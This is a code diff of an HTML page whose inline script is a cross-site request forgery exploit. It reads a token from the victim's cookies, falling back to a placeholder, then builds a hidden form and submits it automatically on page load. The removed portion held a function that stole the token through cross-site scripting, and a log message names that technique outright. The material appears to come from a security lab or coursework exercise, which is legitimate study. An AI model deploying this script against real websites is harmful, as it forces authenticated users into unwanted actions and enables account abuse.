@@ -9,37 +9,21 @@
         <div id="mycsrf"></div>
         <script>
             (function () {
-                
-                var csrf = getTokenFromHTML();
-                csrf = (csrf === '') ? getTokenFromCookie() : csrf;
-                csrf = (csrf === '') ? 'a1b2' : csrf;
+                var csrf = getTokenFromCookie();
+                csrf = (csrf === '' || csrf === undefined || csrf === null) ? 'a1b2' : csrf;
                 var form = createForm('fcab4e7dfbe01ce4e3904b97febe6a6a184302c3', csrf);
                 var div = document.getElementById("mycsrf");
                 div.appendChild(form);
                 
                 var csrfForm = document.getElementById("csrf-form");
                 csrfForm.submit();
-                
             })();
-            
-            function getTokenFromHTML() {
-                var csrfToken;
-                setTimeout(function(){
-                    try {
-                        var header = document.getElementById('header').getElementsByTagName('a')[0];
-                        var href = header.getAttribute('href');
-                        return href.split('=')[1];
-                    }
-                    catch(e) {
-                        console.log("couldn't get the CSRF token using XSS!");
-                    }
-                }, 3);
-            }
             
             function getTokenFromCookie() {
                 var csrfCookie = document.cookie.split(';')[0];
-                console.log('getTokenFromCookie - The token is: ' + csrfCookie.split('=')[1]);
-                return csrfCookie.split('=')[1];
+                var csrfToken = csrfCookie.split('=')[1];
+                console.log('getTokenFromCookie - The token is: ' + csrfToken);
+                return csrfToken;
             }
             
             function addInputToForm(form, name, value) {
